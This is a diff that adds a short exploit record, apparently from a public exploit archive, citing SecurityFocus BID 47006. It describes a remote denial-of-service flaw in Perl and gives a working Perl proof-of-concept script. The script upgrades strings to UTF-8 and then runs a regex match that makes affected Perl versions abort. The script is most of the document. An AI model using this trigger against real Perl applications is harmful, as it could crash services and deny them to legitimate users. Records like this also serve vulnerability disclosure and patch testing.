@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/47006/info
+
+Perl is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue to cause an application implemented with affected perl code to abort, denying service to legitimate users. 
+
+#!/usr/bin/perl
+
+
+my @x = ("A=B","AAAA=/");
+utf8::upgrade $_ for @x;
+$x[1] =~ s{/\s*$}{};
+for (@x) {
+m{^([^=]+?)\s*=.+$};
+}
